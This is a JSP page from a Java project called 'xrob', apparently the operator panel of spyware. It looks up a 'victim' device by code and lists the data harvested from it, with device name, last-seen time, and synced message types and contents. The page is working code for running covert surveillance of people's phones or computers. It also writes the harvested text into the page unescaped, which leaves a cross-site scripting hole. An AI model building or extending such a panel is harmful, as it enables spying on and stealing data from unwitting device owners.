<%@ page import="com.theah64.xrob.api.models.Victim" %>
<%@ page import="java.util.List" %>
<%@ page import="com.theah64.xrob.api.database.tables.Victims" %>
<%@ page import="com.theah64.xrob.api.utils.CommonUtils" %>
<%@ page import="com.theah64.xrob.api.utils.clientpanel.PathInfo" %>
<%@ page import="com.theah64.xrob.api.database.tables.Deliveries" %>
<%@ page import="com.theah64.xrob.api.models.Contact" %>
<%@ page import="com.theah64.xrob.api.database.tables.Contacts" %>
<%@ page import="com.theah64.xrob.api.models.Delivery" %>
<%--
  Created by IntelliJ IDEA.
  User: theapache64
  Date: 12/9/16
  Time: 4:08 PM
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@include file="../signin_check.jsp" %>

<html>
<head>
    <%

    %>
    <title>Deliveries</title>
    <%@include file="../../common_headers.jsp" %>
    <script>
        $(document).ready(function () {

            var $rows = $('table#tDeliveries tr.delivery_row');
            $('input#iSearch').keyup(function () {

                var val = '^(?=.*\\b' + $.trim($(this).val()).split(/\s+/).join('\\b)(?=.*\\b') + ').*$',
                        reg = new RegExp(val, 'i'),
                        text;

                $rows.show().filter(function () {
                    text = $(this).text().replace(/\s+/g, ' ');
                    return !reg.test(text);
                }).hide();
            });

        });


    </script>
</head>
<body>
<div class="container">
    <%@include file="../header.jsp" %>

    <div class="row">
        <%
            try {

                final PathInfo pathInfoUtils = new PathInfo(request.getPathInfo(), 1, 1);
                final String victimCode = pathInfoUtils.getPart(1);
                final Victims victimsTable = Victims.getInstance();
                final Victim theVictim = victimsTable.get(Victims.COLUMN_VICTIM_CODE, victimCode);

                if (theVictim != null) {

                    final String lastDelivery = Deliveries.getInstance().getLastDeliveryTime(theVictim.getId());

        %>


        <div class="row" style="margin-top: 20px;">


            <%
                final List<Delivery> deliveries = Deliveries.getInstance().getAll(theVictim.getId());
                if (deliveries != null) {
            %>
            <div class="col-md-10 content-centered">

                <div class="row" style="margin-bottom: 20px;">
                    <div class="col-md-8 pull-left">
                        <h4><%=theVictim.getDeviceName()%>
                            <small>
                                <%=lastDelivery == null ? "(Not yet seen)" : "(last seen: " + lastDelivery + ")" %>
                            </small>
                        </h4>
                    </div>

                    <div class="col-md-4 pull-right">
                        <div class="input-group">
                            <span class="input-group-addon">
        <i class="glyphicon glyphicon-search"></i>
    </span>
                            <input id="iSearch" placeholder="Search" type="text" class="form-control"/>
                        </div>
                    </div>
                </div>

                <table id="tDeliveries" class="table table-bordered table-condensed">
                    <tr>
                        <th>Type</th>
                        <th>Message</th>
                        <th>Synced</th>
                    </tr>

                    <%
                        for (final Delivery delivery : deliveries) {
                    %>
                    <tr class="delivery_row">
                        <td><%=delivery.getDataType()%>
                        </td>
                        <td><%=delivery.getMessage()%>
                        </td>
                        <td><%=delivery.getRelativeSyncTime()%>
                        </td>
                    </tr>
                    <%
                        }
                    %>

                </table>
            </div>
            <%
                } else {
                    throw new PathInfo.PathInfoException("No delivery found!");
                }
            %>

        </div>

        <%

            } else {
                throw new PathInfo.PathInfoException("Invalid victim code");
            }

        %>
    </div>

    <div class="row">

        <%
        } catch (PathInfo.PathInfoException e) {
            e.printStackTrace();
        %>
        <h1 class="text-danger text-center"><b>Whoops!</b></br> <%=e.getMessage()%>
        </h1>
        <%
            }
        %>
    </div>

</div>
</body>
</html>
